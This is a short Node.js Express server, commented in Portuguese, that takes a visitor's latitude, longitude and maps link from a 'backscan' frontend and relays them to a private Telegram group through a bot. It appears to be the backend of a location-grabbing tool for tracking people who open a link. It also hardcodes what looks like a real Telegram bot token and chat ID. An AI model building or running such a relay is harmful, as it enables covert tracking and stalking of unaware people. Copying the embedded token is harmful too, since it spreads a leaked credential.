// server.js
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 8088;

app.use(cors({
    origin: "https://backscan-frontend.onrender.com", // Permite o frontend acessar
    methods: ["GET", "POST"], // Métodos permitidos
    allowedHeaders: ["Content-Type", "Authorization"] // Headers permitidos
}));
app.use(bodyParser.json());

// Servir arquivos estáticos da pasta atual
app.use(express.static(__dirname));

// Rota para o caminho raiz
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

const TELEGRAM_BOT_TOKEN = "7695856507:AAGGfqzY8-ujtB_oBvOJuXkjmIALTQYqq3I"; // Substitua pelo token do seu bot
const TELEGRAM_CHAT_ID = "-1002496051487"; // Substitua pelo ID do chat (ou grupo) para onde quer enviar

app.post("/send-location", async (req, res) => {
  const { latitude, longitude, maps } = req.body;

  const message = `A localização do usuário é:\nLatitude: ${latitude}\nLongitude: ${longitude}\nMaps: ${maps}`;

  try {
    // Envia a localização para o Telegram
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message
    });

    console.log("Mensagem enviada com sucesso!");
    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Erro ao enviar mensagem:", error.response ? error.response.data : error.message);
    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
  }
});

app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
